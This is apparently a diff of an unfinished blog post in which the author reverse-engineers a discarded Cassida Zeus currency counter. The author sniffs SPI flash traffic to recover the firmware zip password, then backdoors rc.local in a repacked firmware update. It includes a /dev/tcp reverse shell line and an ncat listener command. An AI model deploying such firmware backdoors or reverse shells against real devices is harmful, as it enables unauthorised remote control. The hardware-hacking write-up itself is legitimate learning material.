@@ -12,8 +12,6 @@ tags:
 ## Introduction
 This post will walk through the steps in hacking an embedded machine from A to Z, with any and all pitfalls that crossed my path. If you think I made a mistake or could've taken an easier route, please let me know and I will add it to the post.
 
-[^1]: ...or lack thereof
-
 ## Background
 As a supervisor at [Makerspace Delft](https://www.makerspacedelft.nl/), I often got my hands on some high end trash. It's located on the south side of Delft in an abandoned cable factory[^2] which has been repurposed for hobbyists and startups, although they want to [revamp the entire place in the near future and turn it into a mixed purpose district](https://kabeldistrict.nl/) which makes the future for these kinds of businesses uncertain. Anyhow, I will agree that the place is in need of a cleanup but its shadyness probably led into the creation of this post.
 
@@ -33,16 +31,179 @@ I opted to take the machine and try to hack into it, it was my first time trying
 
 ## Examining the machine
 ![Cassida Zeus](cassida/zeus.PNG)
+
 **So yeah, where do we even start?**  
-What I did at first was look around the machine and see what capabilities it had.
+What I did at first was look around the machine and see what capabilities it had. To get started I looked for a [service manual](https://manualzz.com/doc/65915383/cassida-pro-series-service-manual), and came across one that suited my needs, [^4] I highly recommend skimming over the document to understand this post better.
 
-![Cassida Zeus Backside](cassida/backside.PNG)
+[^4]: This isn't the exact service manual I initially found, so keen observers might see a glimpse of the _"secret"_ test menu. I will get to my discovery of this document later.
 
-Based on this image we can see:
-- USB type-a connectivity. Perhaps for a usb stick to update firmware
-- USB type-b connectivity. Possibly a serial port to talk to the device
-- Ethernet Port. So at least the machine can connect to the internet
-- External Display Connection Port??
-- Thermal Printer Connection Port??[^4]
+![Cassida Zeus Backside](cassida/backside2.PNG)
 
-[^4]: Remember that note at the start with the updated website? They aparently also updated the documentation. The documentation I had used didn't explain the use of the connection port, so I just assumed it was a serial port and wasted time trying to communicate through it. 
+Ah, _interesting_, the USB-B port can be used for a connection to the PC, but reading on we find that we need a specific API for communication, and while trying around in [PuTTy](https://www.putty.org/) and enumerating baud rates, I found no way of getting a response of the machine so gave up. 
+
+![Proprietary API](cassida/usb_connection.PNG)
+
+Based on some poking and interfacing with some of the ports, I got none the wiser and opted to open up the machine and see whats inside.
+
+
+
+## Looking for more information
+Well, that brought us nowhere, so let's look for some more information. The machine has a model number, so let's look that up. The first result is the [Cassida Pro](https://cassidapro.com/) website, which is the company that makes the machine. 
+### Crawling the website
+
+#### "The Spanish Strategy"™
+
+## Decrypt the firmware update
+
+### Brute forcing
+
+### Exploiting weak zip encryption
+
+## Finding the key
+Well, the firmware has to be decrypted somewhere. Unfortunately that place is in the machine itself, so we have to find a way to read it out. Let's start by looking at the board again and looking for some interesting chips.
+
+### Where is it?
+![Cassida Zeus Board](cassida/back_of_the_board.jpg)
+Flipping over the board reveals a bunch of additional chips, and we can see a familiar sight. We can make an educated guess that the large black chip in the middle is the CPU and the two smaller chips to the left are the RAM chips. However the last chip is what we are looking for, the [W25Q256JVFQ](https://www.winbond.com/hq/product/code-storage-flash-memory/serial-nor-flash/?__locale%253Den%2526partNo%253DW25Q256JV) flash chip [^5]. We can follow the standard flash memory naming convention to figure out that this is a 256Mbit flash chip, which is 32MB of storage.
+
+[^5]: ![25Q256JVFQ](cassida/zoomedin.jpg)
+
+As I am a terrible solderer, I wanted to avoid desoldering the chip at all costs. So looked into a way to read it out without removing it from the board. Looking at the flash chip, we can see that it is attached to the board with reasonably large pins[^6], which means that we can probably get away with just connecting some wires to it and reading it out. To connect the wires I used some "IC test hooks"[^7].
+
+[^6]: Compared to the other chips on the board, they're still tiny and fiddly to work with
+[^7]: ![IC test hooks](cassida/probe.webp)
+
+### Talking to the chip
+Since I have a SPI flash reader, I assumed I could just connect the power and data pins to the chip and read it out. According to the [datasheet](https://www.winbond.com/hq/product/code-storage-flash-memory/serial-nor-flash/?__locale%253Den%2526partNo%253DW25Q256JV) of the chip, the specs and pinout are as follows:
+
+![W25Q256JVFQ Pinout](cassida/specs.PNG)
+
+Here we see enough information to get started, we can see that the chip is powered by 3.3V, supports SPI (which is what we will use to talk to it), and has a maximum clock speed of 133MHz. Even though the chip has 16 pins, we only need to connect 6 of them to get started. The pins we need to connect are:
+
+| Pin | Name | Description |
+| --- | ---- | ----------- |
+| 1 | /CS | Chip select, this is used to select the chip we want to talk to. |
+| 2 | DO (MISO)| Data out, this is the data that the chip sends to us. |
+| 3 | GND | Ground, this is the ground pin. |
+| 4 | DI (MOSI)| Data in, this is the data that we send to the chip. |
+| 5 | CLK | Clock, this is the clock signal that we use to synchronize the data transfer. |
+| 6 | VCC | Power, this is the power pin. |
+
+I used a [SPIDriver](https://spidriver.com/)[^8] to connect to the chip, but any SPI flash reader should work.
+
+![SPIDriver connected to the flash chip](cassida/SPIDriver.PNG)
+
+Let's get cooking and send a [simple request](https://spidriver.readthedocs.io/en/latest/index.html) to read the ID of the chip:
+[^8]: ![SPIDriver image](https://spidriver.com/images/spidriver-main@1x.jpg)
+
+```python
+from spidriver import SPIDriver
+s = SPIDriver("/dev/ttyUSB0")
+for _ in range(3):
+    s.sel() # start command
+    s.write([0x9f]) # command 9F is READ JEDEC ID
+    print(list(s.read(3))) # read next 3 bytes
+    s.unsel()
+```
+We expect to get the the ID of the chip three times, so what do we get?
+
+```python
+[0x43, 0x2e, 0x89]
+[0xff, 0xab, 0xf7]
+[0x88, 0x4e, 0x90]
+```
+
+Hmmmmmm.... That's really strange. The likely explanation is that this technique can be noisy because the chip is still attached to the PCB, this means that **our SPIDriver is also powering the rest of the board**, so we are talking to the chip at the same time as the CPU is. This means that we are getting some garbage data back. 
+- A possible fix for this is pulling the reset pin of the CPU low, which should stop it from interfering with our communication. However, as someone who is terrible at soldering, lets not even attempt to deal with the even smaller pins on the CPU.
+- Another probably even smarter fix in hindsight is to just wait for the CPU to boot up and then read the flash chip and go to idle, and then talk during the downtime. However, I didn't think of this at the time. 
+
+### Eavesdropping
+
+Lets use the lesson learned from trying to talk to it directly and try to eavesdrop on the communication between the CPU and the flash chip. We we're already accidentally doing that anyway. To do this we keep the same setup as before and switch out the SPIDriver for a [logic analyzer](https://nl.aliexpress.com/item/1005005357814678.html?spm%253Da2g0o.productlist.main.13.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526aem_p4p_detail%253D202307020817102827198594201600011524413%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-6%2526pdp_npi%253D3%2540dis%2521EUR%25216.08%25215.47%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000032732028934%2521sea%2521NL%25211866391656%2526curPageLogUid%253D4AQ4Y776oOl0%2526search_p4p_id%253D202307020817102827198594201600011524413_7)[^9]. This allows us to see the communication between the CPU and the flash chip. We also switch from a python script to [PulseView](https://sigrok.org/wiki/PulseView), which is a tool for analyzing logic analyzer data. Also I needed the board to boot normally, so I had to attack all the wires back to the board and then boot. This is what the setup looks like:
+
+![Logic analyzer v1 setup](cassida/ShitSetup.PNG)
+
+![Output v1](cassida/logic_analyzer_output.PNG)
+
+We're reading some bits going up and down, so that's good. But it looks a bit scrambled. We're **expecting a clear clock signal** to delineate the bytes[^10], but we are seeing no such thing. We see a regular-ish pattern on the 4th channel but it's switching slower than the clock speed we expect. My hypothesis was that we are sampling too slow, which is why we are getting a mangled clock speed. There's probably some very clever math to figure out what the real clock speed is, but I'm not that clever. So I just tried to sample faster.
+
+The logic analyzer I have can sample at 24MHz, which is a lot lower than the maximal rate of 133MHz the chip supports. So I had to put up some money and buy a better logic analyzer. I bought a [Kingst LA1010](https://nl.aliexpress.com/item/1005004678997124.html?spm%253Da2g0o.productlist.main.19.4b263dceNws6U4%2526algo_pvid%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc%2526algo_exp_id%253D1443ccb4-9247-4b2b-bc7f-e72a9fc33cdc-9%2526pdp_npi%253D3%2540dis%2521EUR%2521109.73%252165.84%2521%2521%2521%2521%2521%254021021aa216883110301477062d0753%252112000030072936740%2521sea%2521NL%25211866391656%2526curPageLogUid%253D3s2ldTngXZjk)[^11], which can sample at 100MHz (at 3 channels, but we just sample DI, DO and CLK), and also switched to [KingstVIS](http://www.qdkingst.com/en)[^12]. This is what the setup looks like now:
+
+![Logic analyzer v2 setup](cassida/setup2.PNG)
+
+![Output v2](cassida/good_capture.PNG)
+
+Now that looks amazing!
+
+[^9]: ![Logic analyzer](cassida/cheap_logic.PNG)
+[^10]: ![SPI timing diagram](cassida/Expectation.PNG)
+[^11]: ![Logic analyzer v2](cassida/logic.PNG)
+[^12]: I believe my logic analyzer came with a license for KingstVIS
+
+### Reconstructing the flash chip
+
+Now that we have a captured SPI conversation from boot all the way to the _firmware update_ menu, the encryption key may have been copied from the flash chip to the CPU. So we simply take all bytes that the flash chip has sent to the CPU and concatenate them together and save it to a file. I wrote a simple parser that used an exported csv from KingstVIS and only looked at the DO line. Unfortunately that script is lost to time. Lets call this file `result.bin`.
+
+![Some present strings](cassida/results.PNG)
+
+And we can already see some interesting stuff. How about we do something simple and just look for a string related to the firmware update, such as zip?
+
+![Zip string](cassida/password.PNG)
+
+And there we are, the password falls right into our lap. The `-P` argument to `unzip` takes in a flag and we can now just read it. [^13]
+
+[^13]: For obvious reasons I'm not going to post the password here.
+
+## Making a backdoor
+
+Now that we have the password, we can modify our own firmware update and use it to patch the machine, so that we can get a shell on it. We can take a look at the files and look for a good place to put our backdoor. 
+
+![Firmware files](cassida/whatsinside.PNG)
+
+`rc.local` looks like a prime candidate, this is a superuser startup script[^14] so will run some POSIX shell code on startup of the device. It looks like this:
+ 
+```bash
+#!/bin/sh
+#
+# This script will be executed *after* all the other init scripts.
+# You can put your own initialization stuff in here
+if [ -x "/usr/bin/rpm" -a -e "/tmp/ltib" ]
+then
+    echo "rebuilding rpm database"
+    rm -rf /tmp/ltib
+    rpm --rebuilddb
+fi
+
+...
+...
+
+if [ -n "$pid" ] ; then 
+echo RecognitionUI OK...
+else
+echo RecognitionUI FAIL...
+./EmergencyUI -qws -nomouse &
+fi
+
+```
+
+While this looked a bit too easy to be true, I just added a line to the end of the file: [^15]
+```bash
+sleep 60
+
+sh -i >& /dev/tcp/192.168.1.x/4444 0>&1
+```
+The sleep was added since the network driver needed some time to start up.
+
+### Putting it all together
+
+So now we save the modified firmware file and zip it back up together using the password we found earlier and rename it to a `.tbk` file. Then I just put it on a USB stick and plugged it into the machine. I then went to the _firmware update_ menu and selected the file. I started up a simple listener on my host with `ncat -nvlp 4444`. The machine then rebooted and I waited for a minute. Then after realizing that a minute takes way more time when anticipating an uncertain outcome something showed up on my screen:
+
+![Shell](cassida/gotem.PNG)
+
+
+
+[^14]: [https://linuxhint.com/use-etc-rc-local-boot/](https://linuxhint.com/use-etc-rc-local-boot/)
+[^15]: I initally tested netcat reverse shells as well, but it was dumb to assume that netcat would be installed on the device. So a shell that uses the built-in `sh` shell makes more sense.
+## Conclusion
+
+## Summary
